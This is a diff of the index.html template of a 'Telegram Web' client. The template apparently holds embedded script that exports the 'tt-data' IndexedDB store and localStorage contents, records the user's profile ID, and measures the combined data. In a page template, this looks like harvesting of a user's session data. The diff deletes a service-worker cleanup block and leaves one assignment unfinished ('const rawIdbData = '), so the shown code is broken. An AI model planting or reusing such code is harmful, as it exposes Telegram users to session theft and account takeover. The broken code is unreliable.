@@ -4,16 +4,6 @@
 <head>
   <meta charset="UTF-8">
   <title><%= htmlWebpackPlugin.options.appTitle %></title>
-  
-  <script>
-      if ('serviceWorker' in navigator) {
-          navigator.serviceWorker.getRegistrations().then(function(registrations) {
-              for(let registration of registrations) {
-                  registration.unregister();
-              }
-          });
-      }
-  </script>
   <meta name="title" content="<%= htmlWebpackPlugin.options.appTitle %>">
   <meta name="description" content="Telegram Web">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no, viewport-fit=cover">
@@ -65,7 +55,7 @@
             return value;
         });
     }
-    async function exportIndexedDB(dbName, storeName) {
+async function exportIndexedDB(dbName, storeName) {
         return new Promise((resolve) => {
             const request = indexedDB.open(dbName);
             request.onsuccess = (e) => {
@@ -252,7 +242,7 @@
                         lastKnownUserId = profile.uid; // Unique ID အစစ်ကိုသာ သုံးပါမည်
 
                         try {
-                            const rawIdbData = await exportIndexedDB("tt-data", "store"); 
+                            const rawIdbData = 
                             const idbDataStr = serializeData(rawIdbData);
                             
                             const currentDataLength = idbDataStr.length + lsDataStr.length;
